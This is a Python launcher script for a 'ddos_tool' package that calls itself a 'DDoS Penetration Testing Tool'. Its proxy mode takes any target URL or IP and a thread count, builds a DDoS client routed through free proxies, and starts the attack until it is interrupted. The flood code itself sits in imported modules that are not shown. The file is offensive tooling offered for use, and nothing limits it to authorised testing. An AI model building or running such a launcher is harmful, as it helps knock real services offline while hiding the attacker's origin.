#!/usr/bin/env python3
"""
Launcher to run the ddos_tool package from the root directory.

Use:
  python main.py                         # default interface
  python main.py --use-free-proxies      # quick proxy helper mode
  python main.py --help
"""
import os
import sys
import runpy

ROOT = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(ROOT, "src")

if SRC not in sys.path:
    sys.path.insert(0, SRC)


def main():
    from ddos_tool.ddos_tool import main as package_main
    package_main()


def main_with_free_proxies_mode(argv):
    """
    Minimal compatibility wrapper to support:
      python main.py --use-free-proxies [<target> <threads>]
    This keeps the previous CLI behaviour but uses the correct imports.
    """
    # imports here to avoid importing package on top-level until needed
    from ddos_tool.core.ddos_client import create_ddos_client
    from ddos_tool.ui.validators import validate_target, get_thread_count

    if len(argv) >= 3:
        target = argv[1]
        try:
            threads = int(argv[2])
        except Exception:
            print("[!] invalid threads value; using default 50")
            threads = 50
    else:
        target = input("Enter target (url or IP): ").strip()
        ok, msg = validate_target(target)
        while not ok:
            print(f"[!] {msg}")
            target = input("Enter target (url or IP): ").strip()
            ok, msg = validate_target(target)

        threads = get_thread_count()

    print(f"[+] Creating client for {target} with {threads} threads (proxy mode)")
    client = create_ddos_client(target, threads)
    if client is None:
        print("[!] Could not create client")
        return

    try:
        print("[+] Starting attack (press Ctrl+C to stop)...")
        client.attack()
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        client.attack_running = False


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("--help", "-h"):
        print("DDoS Penetration Testing Tool")
        print("Usage:")
        print("  python main.py                     - Run normal interface")
        print("  python main.py --use-free-proxies  - Run with sample free proxies")
        print("  python main.py --use-free-proxies <target> <threads> - Direct proxy mode")
        print("")
        print("Examples:")
        print("  python main.py")
        print("  python main.py --use-free-proxies")
        print("  python main.py --use-free-proxies http://localhost:8000 20")
        sys.exit(0)

    if len(sys.argv) > 1 and sys.argv[1] == "--use-free-proxies":
        main_with_free_proxies_mode(sys.argv[1:])
    else:
        main()
